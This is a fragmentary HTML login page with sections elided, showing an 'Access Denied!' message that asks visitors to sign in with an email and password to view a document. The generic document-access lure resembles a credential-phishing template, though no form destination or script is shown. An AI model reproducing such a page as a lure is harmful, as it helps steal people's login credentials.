...
<tr><td height="20%" bgcolor="#000000">
	...
	<td>
		...
		<img src="./files/logo.jpg" width="330" height="70">
...
<tr><td height="70%" background="./files/background.jpg">
	...
	<td>
		...
		<tr><td>
			...
			<font size="+2">Access Denied!</font>

			<br>
			Please sign in with a valid ID to view your document						
		...
		<tr><td>
			...
			<input  name="login" type="emaail" style="width:320px; height:45px; 
		...
		<tr><td>
			...
			<input  name="passwd" type="password" style="width:320px; height:45px; 
			font-family: Verdana; font-size: 14px; color:#000000; background-color: #FFFFFF; border: solid 1px #FFFFFF; padding: 10px; 
			-moz-border-radius: 2px; -webkit-border-radius: 2px; -khtml-border-radius: 2px; border-radius: 2px; 
			-moz-box-shadow: 3px 3px 3px #000000; -webkit-box-shadow: 3px 3px 3px #000000; box-shadow: 3px 3px 3px #000000;" 
...
<tr><td height="10%" bgcolor="#000000">
	...
	<div align="center">
	<img src="./files/footer.png" width="550" height="38">
	</div>
